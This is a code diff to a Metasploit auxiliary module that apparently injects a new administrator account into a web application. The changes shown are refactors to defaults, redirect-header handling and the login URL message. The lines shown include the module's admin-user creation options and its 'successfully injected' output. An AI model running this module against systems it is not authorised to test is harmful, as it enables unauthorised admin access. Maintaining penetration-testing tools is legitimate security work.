@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/']),
       OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username]),
-      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
+      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alphanumeric(16)]),
       OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
     ])
   end
@@ -99,9 +99,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    raw_res = res.to_s
-    if raw_res =~ /^Location:\s*(.+)$/
-      location_value = ::Regexp.last_match(1).strip
+    if res.headers['Location']
+      location_value = res.headers['Location']
       print_status("Redirect #1: #{location_value}")
     else
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
@@ -119,9 +118,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    raw_res = res.to_s
-    if raw_res =~ /^Location:\s*(.+)$/
-      location_value = ::Regexp.last_match(1).strip
+    if res.headers['Location']
+      location_value = res.headers['Location']
       print_status("Redirect #2: #{location_value}")
     else
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
@@ -157,8 +155,8 @@ class MetasploitModule < Msf::Auxiliary
     username = datastore['NEW_USERNAME']
     password = Digest::MD5.hexdigest(datastore['NEW_PASSWORD']).upcase
     email = datastore['NEW_EMAIL']
-    firstname = Rex::Text.rand_text_alpha(1..6)
-    lastname = Rex::Text.rand_text_alpha(1..6)
+    firstname = Faker::Name.first_name
+    lastname = Faker::Name.last_name
     areacode = rand(100..999)
     exchangecode = rand(100..999)
     subscribernumber = rand(1000..9999)
@@ -266,7 +264,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("New admin user was successfully injected:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
-    print_good("Login at: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}workflow/jsp/logon.jsp")
+    print_good("Login at: #{full_uri(normalize_uri(target_uri, 'workflow/jsp/logon.jsp'))}")
   end
 
 end
